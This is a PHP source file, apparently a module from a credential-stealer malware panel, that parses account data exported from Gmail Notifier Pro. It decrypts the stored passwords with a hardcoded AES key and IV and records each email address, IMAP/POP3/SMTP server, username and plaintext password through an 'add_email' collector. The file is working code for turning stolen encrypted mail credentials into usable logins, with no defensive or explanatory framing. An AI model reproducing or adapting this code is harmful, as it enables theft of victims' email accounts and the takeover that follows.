<?php

class Module_gmailnp extends Module_
{
    protected function Decrypt($Password)
    {
		$PW_ = '';
		$Cnt = $StartIndex = 0;
		while($StartIndex < strlen($Password))
		{
			$PW_ .= chr(intval(substr($Password, $StartIndex, 3)));
			$StartIndex += 3;
			$Cnt++;
		}
		
		$KEY = hex2bin("1711136F18E2552D75B81BA3257102D115F0AFAE1136BA1DF71A13D083EC35F9");
		$IV_ = hex2bin("06405B6F7B030B72D38098704F24729C");
		
		return FixNonPrintable(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $KEY, $PW_, MCRYPT_MODE_CBC, $IV_));
    }

    //V3
    protected function ProcessItem($Source)
    {
		$Old = error_reporting(NULL);
		$AccType 	= Assign_($Source->AccountType);
		$Email	 	= Assign_($Source->User);
		$Pass 		= $this->Decrypt($Source->EncryptedPassword);
		
		$POPServer	= Assign_($Source->IncomingServerSettings->Server);
		$POPPort	= Assign_($Source->IncomingServerSettings->Port);
		$POPUser	= Assign_($Source->IncomingServerSettings->Username);
		$POPPass	= $this->Decrypt($Source->IncomingServerSettings->EncryptedPassword);
		
		$SMTPServer	= Assign_($Source->AdvMailAccountSettings->SmtpSettings->Hostname);
		$SMTPPort	= Assign_($Source->AdvMailAccountSettings->SmtpSettings->Port);
		$SMTPUser	= Assign_($Source->AdvMailAccountSettings->SmtpSettings->Username);
		$SMTPPass	= $this->Decrypt($Source->AdvMailAccountSettings->SmtpSettings->EncryptedPassword);
		error_reporting($Old);
		if($AccType == "GmailImap" || $AccType == "Outlook")
		{
			$this->add_email($Email, 'imap', $POPServer, $POPPort, $POPUser, $Pass);
		}
		else if($AccType == "Hotmail" || $AccType == "YahooMail")
		{
			$this->add_email($Email, 'pop3', $POPServer, $POPPort, $POPUser, $Pass);
		}
		
		if($AccType == "GenericPop" || (strlen($POPUser) && strlen($POPPass)))
		{
			$this->add_email($Email, 'pop3', $POPServer, $POPPort, $POPUser, $POPPass);
		}
		
		if(strlen($SMTPUser) && strlen($SMTPPass))
		{
			$this->add_email($Email, 'smtp', $SMTPServer, $SMTPPort, $SMTPUser, $SMTPPass);
		}
    }
    protected function ProcessItems($Elements)
    {
        if(isset($Elements->AccountType))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->AccountType))
            {
                $this->ProcessItem($Element);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
    protected function ProcessGNP($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        if(isset($XML_->AccountList))
        {
            $this->ProcessItems($XML_->AccountList);
        }
		
		$XML_ = NULL;
    }

    
    public function process_module($Data, $Version)
    {
        if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
        {
            $Data = utf8_encode($Data);
            $Data = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $Data);
        }

        switch ($Version)
        {
        case 0:
            $this->ProcessGNP($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}